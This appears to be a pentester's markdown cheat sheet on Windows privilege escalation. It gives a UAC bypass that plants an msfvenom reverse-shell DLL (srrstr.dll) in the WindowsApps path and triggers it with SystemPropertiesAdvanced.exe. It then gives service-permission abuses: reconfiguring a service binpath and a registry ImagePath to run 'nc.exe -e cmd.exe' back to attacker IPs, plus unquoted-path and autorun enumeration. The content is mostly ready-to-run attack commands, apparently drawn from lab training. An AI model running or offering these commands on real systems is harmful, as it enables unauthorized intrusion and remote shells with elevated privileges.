# UAC
Getting infomration about the UAC status

0x1 UAC active
0x0 UAC deactive
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

UAC level
0x5 popup (yes/no)
0x2 credentials (user and password)

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
Path directory
```
cmd /c echo %PATH%
```
Expected output
```
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```
Creating revshell in the following path of WindowsApps
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=6969 -f dll > srrstr.dll
```
Testing connection
```
rundll32 shell32.dll,Control_RunDLL
```
Stopping all processes
```
tasklist /svc | findstr "rundll32"
```
Execute
```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

# Weak Permissions
Using this [tool](https://github.com/GhostPack/SharpUp/)
```
.\SharpUp.exe audit
```
See permission of this services
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
accesschk.exe /accepteula -quvcw WindscribeService
```

Common methods:
1. Change a SecurityService.exe to a revshell with the same name
2. Change the bin path
```
sc config WindscribeService binpath="C:\tools\nc.exe -e cmd.exe 10.10.14.124 6969"
sc stop WindscribeService
sc start WindscribeService
```
3. Unquoted Service Path
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Create a exploit for example:
- C:\Program.exe\
- C:\Program Files (x86)\System.exe

4. Permissive Registry ACLs
```
# Searching for services
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
# Exploit
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
5. Services autorun
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
